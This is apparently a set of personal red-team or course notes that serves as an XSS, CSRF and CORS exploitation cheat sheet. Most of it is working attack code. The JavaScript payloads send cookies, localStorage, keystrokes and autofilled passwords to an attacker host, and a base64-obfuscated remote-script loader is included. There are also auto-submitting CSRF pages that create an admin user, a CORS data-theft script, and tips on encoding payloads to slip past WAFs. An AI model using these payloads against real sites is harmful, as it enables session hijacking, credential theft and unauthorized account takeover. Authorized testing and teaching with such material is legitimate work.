# Enhanced XSS and CSRF Attack Notes

## ✨ Overview

This document expands on the basic commands and techniques for exploiting XSS (Cross-Site Scripting) and CSRF (Cross-Site Request Forgery) vulnerabilities. It includes detailed explanations, practical use cases, and security considerations for each payload or technique.

---

## 🛠️ Setting Up for XSS Attacks

### Launch Attacker Server

```bash
python3 -m http.server 80
```

**Purpose:** Hosts malicious JavaScript files and receives exfiltrated data.

**Use case:** Necessary for payload delivery or capturing stolen information.

---

## 🍎 Cookie Stealing

### JavaScript Payload

```javascript
let cookie = document.cookie;
let encodedCookie = encodeURIComponent(cookie);
fetch("http://ATTACKER-IP/exfil?data=" + encodedCookie);
```

**Purpose:** Sends victim's cookies to the attacker.

**Use case:** Session hijacking by stealing session tokens stored in cookies.

**Note:** This won’t work if the cookie is marked `HttpOnly`.

---

## 🌐 LocalStorage Exfiltration

```javascript
let data = JSON.stringify(localStorage);
let encodedData = encodeURIComponent(data);
fetch("http://ATTACKER-IP/exfil?data=" + encodedData);
```

**Purpose:** Steals localStorage contents, which may contain sensitive tokens or user data.

**Use case:** Applicable if the app stores auth tokens or PII in localStorage.

---

## ⌨️ Keylogging with XSS

```javascript
function logKey(event) {
    fetch("http://ATTACKER-IP/k?key=" + event.key);
}
document.addEventListener('keydown', logKey);
```

**Purpose:** Captures and exfiltrates keystrokes.

**Use case:** Ideal for stealing credentials typed into login forms.

**Limitation:** Only works on the same tab and document.

---

## 🔑 Password Manager Auto-Fill Theft

```javascript
let body = document.getElementsByTagName("body")[0];

var u = document.createElement("input");
u.type = "text";
u.style.position = "fixed";
u.style.opacity = "0";

var p = document.createElement("input");
p.type = "password";
p.style.position = "fixed";
p.style.opacity = "0";

body.append(u);
body.append(p);

setTimeout(function() {
  fetch("http://ATTACKER-IP/k?u=" + u.value + "&p=" + p.value);
}, 5000);
```

**Purpose:** Steals auto-filled credentials.

**Use case:** Effective against password managers if the form is filled automatically.


## Discovering the Vulnerability

URL:

```shell
https://target/category/example.html/ref=c:2'+alert(1)+'
```

---

## Loading Remote Scripts

Burp:

- Let's access the Site map tool by clicking on Target > Site map.
-  We can find the JavaScript files Shopizer uses by clicking on http://shopizer:8080 > resources > js.

```shell
mkdir ~/xss/
cd ~/xss/
nano xss.js
cat xss.js
    alert('It worked!')
python3 -m http.server 80
```

We can use the Decoder tool in Burp Suite to Base64-encode our fetch() call. Let's click on the Decoder tab and paste our payload in the text box. Since we will be Base64-encoding for this part of the payload, we'll click we'll click Encode as ... > Base64.

```shell
jQuery.getScript('http://192.168.00.000/xss.js')
```

```shell
'+eval(atob('alF1ZXJ5LmdldFNjcmlwdCgnaHR0cDovLzE5Mi4xNjguNDkuNTEveHNzLmpzJyk='))+'
```

```shell
'+btoa(eval(atob('alF1ZXJ5LmdldFNjcmlwdCgnaHR0cDovLzE5Mi4xNjguNDkuNTEveHNzLmpzJyk=')))+'
```



## 🚨 Anti-Caching Payload

```html
<img src="x" onerror="var s=document.createElement('script'); s.src='http://ATTACKER-IP/xss.js?' + Math.random(); document.body.appendChild(s);">
```

**Purpose:** Bypasses browser caching (304 responses).

**Use case:** Ensures fresh loading of `xss.js` on every execution.

---

## 🌍 Basic and Alternative XSS Payloads

### Script Tag Injection

```html
<script src="http://ATTACKER-IP/xss.js"></script>
```

### Mouse Hover Payload

```html
<div onmouseover="var s=document.createElement('script'); s.src='http://ATTACKER-IP/xss.js'; document.body.appendChild(s);">Hover Me</div>
```

### Click Event Payload

```html
<a href="#" onclick="var s=document.createElement('script'); s.src='http://ATTACKER-IP/xss.js'; document.body.appendChild(s);">Click Me</a>
```

---

## ⚡ CSRF Attacks

### Single Action CSRF (Add New User)

```html
<html>
<body onload="document.forms['csrf'].submit()">
  <form action="https://TARGET-APP/webtools/control/createUserLogin" method="post" name="csrf">
    <input type="hidden" name="userLoginId" value="csrftest">
    <input type="hidden" name="currentPassword" value="password">
    <input type="hidden" name="currentPasswordVerify" value="password">
  </form>
</body>
</html>
```

### Dual-Form CSRF (Add User + Grant Admin Privileges)

```html
<html>
<head>
<script>
  function submitForms() {
    document.forms['csrf'].submit();
    setTimeout(function() {
      document.forms['csrf2'].submit();
    }, 1000);
  }
</script>
</head>
<body onload="submitForms();">
  <form action="https://TARGET-APP/webtools/control/createUserLogin" method="post" name="csrf">
    <input type="hidden" name="userLoginId" value="csrftest">
    <input type="hidden" name="currentPassword" value="password">
    <input type="hidden" name="currentPasswordVerify" value="password">
  </form>
  <form action="https://TARGET-APP/webtools/control/userLogin_addUserLoginToSecurityGroup" method="post" name="csrf2">
    <input type="hidden" name="userLoginId" value="csrftest">
    <input type="hidden" name="groupId" value="SUPER">
  </form>
</body>
</html>
```

### Hosting CSRF Files

```bash
sudo cp your-csrf-file.html /var/www/html/
sudo systemctl restart apache2
```

---

## 🔐 CORS Misconfiguration Testing

### Basic OPTIONS Request

```bash
curl -X "OPTIONS" -i -k https://TARGET-APP/allowlist
```

### Spoof Origin with Similar Domain

```bash
curl -X "OPTIONS" -i -H "Origin: http://www.target-security.com" -k https://TARGET-APP/allowlist
```

### Spoof with Prefix/Suffix Variants

```bash
curl -X "OPTIONS" -i -H "Origin: http://faketarget-security.com" -k https://TARGET-APP/allowlist
curl -X "OPTIONS" -i -H "Origin: http://target-security.net" -k https://TARGET-APP/allowlist
```

### Exploiting CORS with JavaScript

```javascript
fetch('https://vulnerable-site/api/sensitive-data', {
  method: 'GET',
  credentials: 'include'
})
.then(res => res.json())
.then(data => {
  fetch('http://ATTACKER-IP/corsdata?data=' + encodeURIComponent(JSON.stringify(data)));
});
```

---

## 🕵️ Tips for Red Teamers

* Always obfuscate or encode your payloads to bypass WAFs.
* Mix event handlers (`onerror`, `onload`, `onclick`) depending on injection context.
* Combine CSRF and XSS for deeper privilege escalation.
* Use `Content-Security-Policy` bypass payloads where applicable.

---

**Stay Legal!** These techniques should only be used in authorized testing environments or with explicit permission.

---

